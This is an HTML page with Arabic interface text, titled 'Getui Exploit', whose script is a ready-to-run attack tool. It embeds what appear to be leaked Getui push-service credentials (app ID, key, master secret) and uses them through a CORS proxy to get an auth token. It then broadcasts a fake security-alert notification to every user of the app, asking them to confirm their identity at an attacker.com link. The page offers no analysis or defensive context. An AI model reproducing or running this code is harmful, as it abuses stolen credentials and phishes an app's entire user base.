<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>🔥 Getui Exploit</title>
</head>
<body>
    <h1>🚀 Getui Exploit</h1>
    <button onclick="runExploit()">▶️ تشغيل الاستغلال</button>
    <pre id="output">⏳ انتظر...</pre>

    <script>
        const output = document.getElementById('output');
        function log(msg) { output.textContent += msg + '\n'; }

        const APP_ID = "MYzecv9re49MHZCbb8mpW";
        const APP_KEY = "DnbmCBfOWf8ejt0hITntF5";
        const MASTER_SECRET = "wBfbpF3IP19KSHiCh2Q5U3";

        const TITLE = "🔴 تنبيه أمني";
        const BODY = "تم اكتشاف اختراق محتمل. يرجى تأكيد هويتك.";
        const CLICK_URL = "https://attacker.com/verify";

        const PROXY = "https://cors-anywhere.herokuapp.com/";

        async function sha256(msg) {
            const buffer = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(msg));
            return Array.from(new Uint8Array(buffer)).map(b => b.toString(16).padStart(2,'0')).join('');
        }

        async function getToken() {
            const ts = Date.now().toString();
            const sign = await sha256(APP_KEY + ts + MASTER_SECRET);
            const payload = { appkey: APP_KEY, timestamp: ts, sign: sign };

            try {
                const res = await fetch(`${PROXY}https://restapi.getui.com/v2/${APP_ID}/auth`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await res.json();
                log('📨 Auth: ' + JSON.stringify(data, null, 2));
                if (data.code === 0 && data.data?.token) {
                    log('✅ Token: ' + data.data.token.slice(0,30) + '...');
                    return data.data.token;
                } else {
                    log('❌ فشل: ' + JSON.stringify(data));
                    return null;
                }
            } catch(e) {
                log('❌ خطأ: ' + e);
                return null;
            }
        }

        async function sendPushAll(token) {
            const payload = {
                request_id: Date.now().toString(),
                audience: "all",
                settings: { ttl: 3600000 },
                push_message: {
                    notification: {
                        title: TITLE,
                        body: BODY,
                        click_type: "url",
                        url: CLICK_URL
                    }
                }
            };

            try {
                const res = await fetch(`${PROXY}https://restapi.getui.com/v2/${APP_ID}/push/all`, {
                    method: 'POST',
                    headers: { 'token': token, 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                const data = await res.json();
                log('📨 Push: ' + JSON.stringify(data, null, 2));
                if (data.code === 0) log('✅ تم الإرسال!');
                else log('❌ فشل: ' + JSON.stringify(data));
            } catch(e) {
                log('❌ خطأ: ' + e);
            }
        }

        async function runExploit() {
            log('🚀 بدء استغلال Getui...\n');
            const token = await getToken();
            if (token) await sendPushAll(token);
            else log('❌ لا يمكن المتابعة.');
        }
    </script>
</body>
</html>
